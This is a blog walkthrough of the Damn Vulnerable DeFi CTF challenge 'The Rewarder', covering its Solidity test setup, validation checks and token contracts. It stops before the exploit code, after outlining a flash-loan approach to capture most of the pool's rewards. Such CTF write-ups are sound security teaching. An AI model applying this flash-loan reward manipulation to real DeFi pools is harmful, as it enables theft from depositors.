<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  CTF walkthrough, Damn Vulnerable DeFi, #5 The rewarder · vyorkin.org
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Vasiliy Yorkin">
<meta name="description" content="Challenge Link to heading Today we&rsquo;re going to take a look at The Rewarder challenge:
There&rsquo;s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don&rsquo;t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. Oh, by the way, rumours say a new pool has just landed on mainnet.">
<meta name="keywords" content="Vasiliy Yorkin">
<meta name="fediverse:creator" content="" />


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CTF walkthrough, Damn Vulnerable DeFi, #5 The rewarder">
  <meta name="twitter:description" content="Challenge Link to heading Today we’re going to take a look at The Rewarder challenge:
There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. Oh, by the way, rumours say a new pool has just landed on mainnet.">

<meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder/">
  <meta property="og:site_name" content="vyorkin.org">
  <meta property="og:title" content="CTF walkthrough, Damn Vulnerable DeFi, #5 The rewarder">
  <meta property="og:description" content="Challenge Link to heading Today we’re going to take a look at The Rewarder challenge:
There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. Oh, by the way, rumours say a new pool has just landed on mainnet.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-08-17T00:33:00+03:00">
    <meta property="article:modified_time" content="2022-08-17T00:33:00+03:00">
    <meta property="article:tag" content="Blockchain">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Security">




<link rel="canonical" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder/">


<link rel="preload" href="https://vyorkin.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://vyorkin.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://vyorkin.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.07092c1350ffd254998dc43a44ae96e617d14af4df4602626878df89189c5e1a.css" integrity="sha256-BwksE1D/0lSZjcQ6RK6W5hfRSvTfRgJiaHjfiRicXho=" crossorigin="anonymous" media="screen" />





  
    
    
    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  




  
  <link rel="stylesheet" href="https://vyorkin.org/custom.min.37b90b4ab2011637071ddd3590a64f81899b71c028d2d366c001566e70ee9e90.css" integrity="sha256-N7kLSrIBFjcHHd01kKZPgYmbccAo0tNmwAFWbnDunpA=" crossorigin="anonymous" media="screen" />


<link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="https://vyorkin.org/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://vyorkin.org/images/apple-touch-icon.png">

<link rel="manifest" href="https://vyorkin.org/site.webmanifest">
<link rel="mask-icon" href="https://vyorkin.org/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-dark">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://vyorkin.org/">
      vyorkin.org
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://vyorkin.org/about/">about</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://vyorkin.org/posts/">posts</a>
            </li>
          
        
        
          
          
          
            
          
            
              
                <li class="navigation-item menu-separator">
                  <span>|</span>
                </li>
                
              
              <li class="navigation-item">
                <a href="https://vyorkin.org/ru-ru/">ru</a>
              </li>
            
          
            
              
              <li class="navigation-item">
                <a href="https://vyorkin.org/de-de/">de</a>
              </li>
            
          
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder/">
              CTF walkthrough, Damn Vulnerable DeFi, #5 The rewarder
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="171733-08-17T00:33:00&#43;03:00">
                August 17, 171733
              </time>
            </span>
          </div>
          
          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://vyorkin.org/categories/blockchain/">Blockchain</a>
      <span class="separator">•</span>
    <a href="https://vyorkin.org/categories/ctf/">Ctf</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://vyorkin.org/tags/blockchain/">Blockchain</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://vyorkin.org/tags/ctf/">Ctf</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://vyorkin.org/tags/security/">Security</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <h2 id="challenge">
  Challenge
  <a class="heading-link" href="#challenge">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Today we&rsquo;re going to take a look at <a href="https://www.damnvulnerabledefi.xyz/challenges/5.html"  class="external-link" target="_blank" rel="noopener">The Rewarder</a> challenge:</p>
<blockquote class="quote2 quote2-question">There&rsquo;s a pool offering rewards in tokens every 5 days for those
who deposit their DVT tokens into it. Alice, Bob, Charlie and
David have already deposited some DVT tokens, and have won their
rewards! You don&rsquo;t have any DVT tokens. But in the upcoming
round, you must claim most rewards for yourself. Oh, by the way,
rumours say a new pool has just landed on mainnet. Isn&rsquo;t it
offering DVT tokens in flash loans?
</blockquote>

<h2 id="analysis">
  Analysis
  <a class="heading-link" href="#analysis">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Let&rsquo;s explore the smart contracts! For this challenge we have 5 of them:</p>
<ul>
<li><code>DamnValuableToken</code> &ndash; The ERC20 token deposited into <code>TheRewarderPool</code> by users
(DVT aka the &ldquo;liquidity token&rdquo;).</li>
<li><code>AccouningToken</code> &ndash; The ERC20 named <code>rToken</code> (rTKN). Used for internal
accounting and snapshots. Pegged \( 1:1 \) with the &ldquo;liquidity token&rdquo;
(DVT).</li>
<li><code>RewardToken</code> &ndash; The ERC20 token in which rewards are issued (RWT).</li>
<li><code>TheRewarderPool</code> &ndash; The pool offering rewards every \( 5 \) days.</li>
<li><code>FlashLoanerPool</code> &ndash; Another pool, which allows us to get a
flash loan in DVT. Has \( 1000000 \) (1 million) DVT&rsquo;s in it.</li>
</ul>
<p>Now, let&rsquo;s review the setup code in <code>TheRewarder.t.sol</code> test contract.</p>
<h3 id="setup">
  SetUp
  <a class="heading-link" href="#setup">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>There are 2 constants:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">internal</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">TOKENS_IN_LENDER_POOL</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">1</span><span style="color:#434f54">_000_000e18</span>;
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">internal</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">USER_DEPOSIT</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span>;
</span></span></code></pre></div><p>The first one is used to set initial token balance of the pool
offering flash loans:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoanerPool</span>), <span style="color:#434f54">TOKENS_IN_LENDER_POOL</span>);
</span></span></code></pre></div><p>The second one is the amount of tokens each user deposits:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">for</span> (<span style="color:#00979d">uint8</span> <span style="color:#434f54">i</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">4</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Each user gets 100 DVT&#39;s
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>], <span style="color:#434f54">USER_DEPOSIT</span>); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Approve spending of 100 DVT and make a deposit
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">dvt</span>.<span style="color:#434f54">approve</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">theRewarderPool</span>), <span style="color:#434f54">USER_DEPOSIT</span>); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">deposit</span>(<span style="color:#434f54">USER_DEPOSIT</span>); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Ensure that the pool&#39;s accounting token increased
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">assertEq</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">accToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]),
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">USER_DEPOSIT</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Initially there are \( 400 \) accounting tokens minted (\( 100 \) tokens
for each user) and no rewards distributed:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">accToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#434f54">USER_DEPOSIT</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">4</span>);
</span></span><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#8a7b52">0</span>);
</span></span></code></pre></div><p>Then it advances the time \( 5 \) days (the
minimum duration of round) so that depositors can get
rewards:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">vm</span>.<span style="color:#434f54">warp</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">5</span> <span style="color:#00979d">days</span>);
</span></span></code></pre></div><p>And calls the <code>distributeRewards()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">for</span> (<span style="color:#00979d">uint8</span> <span style="color:#434f54">i</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">4</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">distributeRewards</span>(); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]), <span style="color:#8a7b52">25</span><span style="color:#434f54">e18</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span>);
</span></span></code></pre></div><p>It asserts that:</p>
<ul>
<li>Each depositor gets \( 25 \) reward tokens (RWT).</li>
<li>The are \( 4 × 25 = 100 \) reward tokens (RWT) emitted.</li>
</ul>
<p>It also cheks that we start with zero DVT tokens in balance:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">attacker</span>), <span style="color:#8a7b52">0</span>);
</span></span></code></pre></div><p>And that the 2 rounds have occurred so far:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">roundNumber</span>(), <span style="color:#8a7b52">2</span>);
</span></span></code></pre></div><p>Next, let&rsquo;s go over the <code>validation()</code> function.</p>
<h3 id="validation">
  Validation
  <a class="heading-link" href="#validation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>It asserts that only one round have taken place:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">roundNumber</span>(), <span style="color:#8a7b52">3</span>);
</span></span></code></pre></div><p>Then it ensures that users get negligible rewards this round:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">for</span> (<span style="color:#00979d">uint8</span> <span style="color:#434f54">i</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">4</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">distributeRewards</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">rewardPerUser</span> <span style="color:#728e00">=</span> <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">delta</span> <span style="color:#728e00">=</span> <span style="color:#434f54">rewardPerUser</span> <span style="color:#728e00">-</span> <span style="color:#8a7b52">25</span><span style="color:#434f54">e18</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assertLt</span>(<span style="color:#434f54">delta</span>, <span style="color:#8a7b52">1</span><span style="color:#434f54">e16</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>It calls the <code>distributeRewards()</code> for each user.</li>
<li>Calculates the current round reward (<code>delta</code>).</li>
<li>Asserts that it is less than \( 0.01 \) RWT.</li>
</ul>
<p>Finally, it checks that rewards have been issued:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertGt</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span>);
</span></span></code></pre></div><p>And that the amount of rewards earned by attacker is really
close to \( 100 \) tokens:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">rewardAttacker</span> <span style="color:#728e00">=</span> <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">deltaAttacker</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span> <span style="color:#728e00">-</span> <span style="color:#434f54">rewardAttacker</span>;
</span></span><span style="display:flex;"><span><span style="color:#434f54">assertLt</span>(<span style="color:#434f54">deltaAttacker</span>, <span style="color:#8a7b52">1</span><span style="color:#434f54">e17</span>);
</span></span></code></pre></div><p>The attacker finishes with zero DVT tokens in balance:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">attacker</span>), <span style="color:#8a7b52">0</span>);
</span></span></code></pre></div><p>Let&rsquo;s take a look at the challenge contracts.</p>
<h3 id="accountingtoken">
  AccountingToken
  <a class="heading-link" href="#accountingtoken">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>It inherits from the
<a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot"  class="external-link" target="_blank" rel="noopener">ERC20Snapshot</a>
and
<a href="https://docs.openzeppelin.com/contracts/3.x/api/access#AccessControl"  class="external-link" target="_blank" rel="noopener">AccessControl</a>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">AccountingToken</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ERC20Snapshot</span>, <span style="color:#434f54">AccessControl</span> { ... }
</span></span></code></pre></div><p>The <code>ERC20Snapshot</code> is an <code>ERC20</code> extension that lets you record
the total supply and balance of an account at the specific point
in time to retrieve later. The <code>AccessControl</code> contract allows
to implement role-based access control. <code>AccountingToken</code> uses
it to define 3 roles: minter, shapshot and burner:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">MINTER_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;MINTER_ROLE&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">SNAPSHOT_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;SNAPSHOT_ROLE&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">BURNER_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;BURNER_ROLE&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">constructor</span>() <span style="color:#434f54">ERC20</span>(<span style="color:#7f8c8d">&#34;rToken&#34;</span>, <span style="color:#7f8c8d">&#34;rTKN&#34;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">DEFAULT_ADMIN_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">MINTER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">SNAPSHOT_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">BURNER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It also has 3 corresponding external functions: <code>mint</code>,
<code>snapshot</code> and <code>burn</code>.</p>
<p>The <code>transfer</code> and <code>approve</code> functionality of ERC20 is
&ldquo;disabled&rdquo;:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_transfer</span>(<span style="color:#00979d">address</span>, <span style="color:#00979d">address</span>, <span style="color:#00979d">uint256</span>) <span style="color:#728e00">internal</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">revert</span> <span style="color:#434f54">NotImplemented</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_approve</span>(<span style="color:#00979d">address</span>, <span style="color:#00979d">address</span>, <span style="color:#00979d">uint256</span>) <span style="color:#728e00">internal</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">revert</span> <span style="color:#434f54">NotImplemented</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="rewardtoken">
  RewardToken
  <a class="heading-link" href="#rewardtoken">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Defines the minter role and the corresponding function to mint
reward tokens. It gives that minter role only to the contract creator:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">12</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">ERC20</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/token/ERC20/ERC20.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">AccessControl</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;openzeppelin-contracts/access/AccessControl.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">/**
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @title RewardToken
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> * @dev A mintable ERC20 with 2 decimals to issue rewards
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">RewardToken</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ERC20</span>, <span style="color:#434f54">AccessControl</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">MINTER_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;MINTER_ROLE&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">Forbidden</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>() <span style="color:#434f54">ERC20</span>(<span style="color:#7f8c8d">&#34;Reward Token&#34;</span>, <span style="color:#7f8c8d">&#34;RWT&#34;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">DEFAULT_ADMIN_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">MINTER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">mint</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">to</span>, <span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">hasRole</span>(<span style="color:#434f54">MINTER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)) <span style="color:#728e00">revert</span> <span style="color:#434f54">Forbidden</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_mint</span>(<span style="color:#434f54">to</span>, <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="flashloanerpool">
  FlashLoanerPool
  <a class="heading-link" href="#flashloanerpool">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Just a regular flash loan pool implementation we already
familiar with. We can use it to borrow some DVT&rsquo;s by
implementing the <code>receiveFlashLoan(uint256)</code> function in our
<code>Exploit</code> contract:</p>
